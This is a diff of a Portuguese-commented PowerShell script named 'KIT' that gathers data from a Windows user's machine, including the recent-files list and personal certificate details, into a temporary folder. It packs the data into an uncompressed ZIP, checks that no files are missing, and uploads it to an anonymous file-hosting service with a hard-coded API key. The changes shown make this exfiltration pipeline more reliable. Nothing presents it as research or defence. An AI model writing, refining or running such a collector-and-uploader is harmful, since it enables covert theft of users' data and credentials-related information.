@@ -1,4 +1,4 @@
-# KIT v3.4 – AnonFilesNew, ZIP sem compressão, 20 GB max, PS 7.5.4
+# KIT v4.1 – ZIP único, confere conteúdo, sem compressão, AnonFilesNew 20 GB
 $kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null
 
 # 1) TXT leves
@@ -24,16 +24,21 @@ Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt
 # 3) Certificados
 Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8
 
-# 4) ZIP sem compressão (modo STORE) via Shell
+# 4) ZIP sem compressão – garantido
 $zip="$env:TEMP\k.zip"
 if(Test-Path $zip){Remove-Item $zip -Force}
 $shell=New-Object -ComObject Shell.Application
 $zipFile=$shell.NameSpace($zip)
+# copia tudo
 Get-ChildItem $kit |%{$zipFile.CopyHere($_.FullName,4)}
-# aguarda cópia terminar
-while($zipFile.Items().Count -lt (Get-ChildItem $kit).Count){Start-Sleep -Milliseconds 500}
+# aguarda terminar
+while($zipFile.Items().Count -ne (Get-ChildItem $kit).Count){Start-Sleep -m 500}
+# confere
+if((Get-childitem $kit).Count -ne $zipFile.Items().Count){
+  Write-Host "ERRO: arquivos faltando no ZIP" -Fore Red; exit
+}
 
-# 5) Upload AnonFilesNew com key
+# 5) Upload
 $file=Get-Item $zip
 $key="AFtru5qQZX8HN5npouThcNDJtVbe6d"
 $uri="https://api.anonfilesnew.com/upload?key=$key&pretty=true"
@@ -49,8 +54,7 @@ try{
   )
   $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
   $resp=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
-  $url=$resp.data.file.url.full
-  Write-Host "SUCESSO – arquivo sem compressão enviado: $url" -Fore Green
+  $resp.data.file.url.full
 }catch{
   Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
 }
